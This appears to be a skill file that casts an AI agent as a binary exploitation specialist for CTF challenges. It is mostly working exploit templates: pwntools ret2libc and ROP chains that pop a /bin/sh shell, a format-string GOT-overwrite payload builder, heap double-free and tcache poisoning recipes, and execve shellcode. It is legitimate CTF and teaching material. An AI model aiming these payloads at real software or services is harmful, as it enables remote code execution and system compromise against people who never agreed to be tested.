---
name: pwn
description: >
  Binary exploitation specialist. Covers buffer overflows, ROP chains, ret2libc,
  format string, heap exploitation, use-after-free, shellcode, and protection bypasses.
metadata:
  user-invocable: "true"
  argument-hint: "[binary-file]"
  category: pwn
---

# Binary Exploitation

You are the binary exploitation specialist for CTF challenges. Analyze the binary, identify memory corruption vulnerabilities, and develop exploits to capture the flag.

## Initial Analysis

```bash
# File type and architecture
file ./binary

# Security protections
checksec --file=./binary

# Dynamic symbols
objdump -T ./binary | grep -i "system\|execve\|puts\|printf\|gets\|scanf\|read\|write\|malloc\|free"

# Static analysis (if stripped)
objdump -d ./binary | less
readelf -s ./binary    # symbol table
readelf -S ./binary    # section headers

# Quick strings scan
strings ./binary | grep -i "flag\|shell\|bin\|sh\|cat\|system"
```

## Protection Summary

| Protection | Check | Bypass Strategy |
|------------|-------|-----------------|
| NX/DEP | checksec | ROP chains, ret2libc |
| ASLR | checksec (PIE) | Info leak, partial overwrite |
| Stack Canary | checksec | Format string leak, brute force |
| PIE | checksec | Info leak, partial overwrite |
| RELRO | checksec | Overwrite GOT if partial |

## Buffer Overflow (Stack-Based)

### Finding the Offset
```bash
# Generate cyclic pattern
python3 -c "from pwn import *; print(cyclic(200))" | ./binary

# Or use pwntools
python3 -c "
from pwn import *
p = process('./binary')
p.sendline(cyclic(200))
p.wait()
# Check core: dmesg | tail or gdb
"
```

### GDB + GEF/pwndbg
```gdb
# Run with input
run <<< $(python3 -c "print('A'*100)")

# Find offset from crash
pattern create 200
pattern offset $rsp

# Check memory
x/20gx $rsp
info registers
x/1i $rip

# Set breakpoint
b *main+100
b *0x08048456
```

## ret2libc

```python
from pwn import *

# Setup
context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')  # or find via ldd
p = remote('HOST', PORT)  # or process('./binary')

# Step 1: Leak libc address via puts@plt
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()  # return to main for second stage

payload = flat(
    b'A' * OFFSET,
    rop.chain()
)
p.sendlineafter(b'> ', payload)

# Parse leak
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Step 2: Call system('/bin/sh')
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])

payload2 = flat(
    b'A' * OFFSET,
    rop2.chain()
)
p.sendlineafter(b'> ', payload2)
p.interactive()
```

## ROP Chains

### Manual ROP
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
rop.call('execve', [next(elf.search(b'/bin/sh')), 0, 0])

# Or manual gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # for stack alignment

payload = flat(
    b'A' * OFFSET,
    ret,              # align stack to 16 bytes
    pop_rdi,
    next(elf.search(b'/bin/sh')),
    elf.symbols['system']
)
```

### One Gadget
```bash
one_gadget ./libc.so.6
# Try each constraint until one works
```

## Format String Vulnerability

```python
from pwn import *

# Stack leak: %p %p %p %p %p %p %p %p
# String leak: %s  (with pointer on stack)
# Write: %n (writes count of bytes printed so far)
# Targeted write: %10$n (write to 10th argument)

# Overwrite GOT entry
# 1. Find format string offset
payload = b"AAAA %p %p %p %p %p %p %p %p"
# If AAAA appears at offset N:
# AAAA_N$08x → prints AAAA's address

# 2. Short writes for arbitrary write
def fmt_write(addr, value, offset):
    """Generate format string payload to write value at addr"""
    payload = b""
    written = 0
    # Split into two 2-byte writes
    for i in range(2):
        target = (value >> (i * 16)) & 0xffff
        if target > written:
            payload += f"%{target - written}c".encode()
            written = target
        payload += f"%{offset + i}$hn".encode()
    # Pad to 8-byte alignment, then addresses
    payload = payload.ljust(align(len(payload), 8), b'A')
    for i in range(2):
        payload += p64(addr + i * 2)
    return payload
```

## Heap Exploitation

### Fastbin Attack
```python
# Double free → fastbin[0] → A → B → A
# 1. malloc(A), malloc(B)
# 2. free(A), free(B), free(A)  # double free
# 3. malloc(X): write target address as fd
# 4. malloc(Y), malloc(Z): returns target address

from pwn import *

def fastbin_double_free():
    # Allocate
    a = malloc(0x60)  # fastbin size
    b = malloc(0x60)
    
    # Double free
    free(a)
    free(b)
    free(a)
    
    # Overwrite fd
    c = malloc(0x60)
    write(c, p64(TARGET_ADDR - 0x10))  # fake chunk size
    
    # Allocate to target
    malloc(0x60)  # consumes B
    malloc(0x60)  # returns A
    d = malloc(0x60)  # returns TARGET_ADDR
```

### tcache Poisoning (glibc 2.26+)
```python
# Simpler than fastbin - no double-free check
# 1. free(A), free(B)  → tcache: B → A
# 2. Overwrite B's fd to target
# 3. malloc → returns B, then malloc → returns target
```

### Unsorted Bin Leak
```python
# Free a large chunk → goes to unsorted bin
# fd/bk point into main_arena (inside libc)
# Read freed chunk to leak libc address
```

## Shellcode

### x86_64 Linux Shellcode
```python
from pwn import *
context.arch = 'amd64'

# execve('/bin/sh', 0, 0)
shellcode = asm("""
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
""")

# Or use pwntools shellcraft
shellcode = shellcraft.amd64.sh()
shellcode = asm(shellcode)
```

### x86 (32-bit) Shellcode
```python
context.arch = 'i386'
shellcode = asm(shellcraft.i386.sh())
```

### Shellcode with Restrictions
```python
# Alphanumeric only
shellcode = asm(shellcraft.amd64.alpha_sh())

# Avoid null bytes
# Use xor reg, reg instead of mov reg, 0
# Use push/pop tricks
```

## Integer Overflow

```python
# If size check uses signed comparison but memcpy uses unsigned:
# Send -1 (0xffffffff) → passes signed check, copies 4GB → crash
# Send value that wraps: e.g., 0x100 + OFFSET where check is value < MAX
```

## PIE/ASLR Bypass

```python
# Partial overwrite: leak lower bytes, brute force 12 bits (1/4096)
# If you have info leak:
base_leak = u64(p.recv(6).ljust(8, b'\x00'))
elf.address = base_leak - OFFSET_OF_LEAKED_ADDR
log.info(f"PIE base: {hex(elf.address)}")
```

## Pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# Setup
context.binary = elf = ELF('./binary')
context.log_level = 'debug'

# libc = ELF('./libc.so.6')  # uncomment if libc provided

def conn():
    if args.REMOTE:
        return remote('HOST', PORT)
    elif args.GDB:
        return gdb.debug('./binary', 'b *main')
    else:
        return process('./binary')

p = conn()

# === Exploit ===
OFFSET = 72  # from cyclic pattern

payload = flat(
    b'A' * OFFSET,
    # ROP chain here
)

p.sendline(payload)
p.interactive()
```

## Quick Reference

| Task | Command |
|------|---------|
| Check protections | `checksec --file=./binary` |
| Find functions | `objdump -d ./binary \| grep '<func>'` |
| Find strings | `strings ./binary \| grep -i flag` |
| Debug | `gdb ./binary` then `run` |
| Trace syscalls | `strace ./binary` |
| Trace libs | `ltrace ./binary` |
| libc version | `strings ./libc.so.6 \| grep "GLIBC"` |
| One gadget | `one_gadget ./libc.so.6` |
| ROP gadgets | `ROPgadget --binary ./binary` |
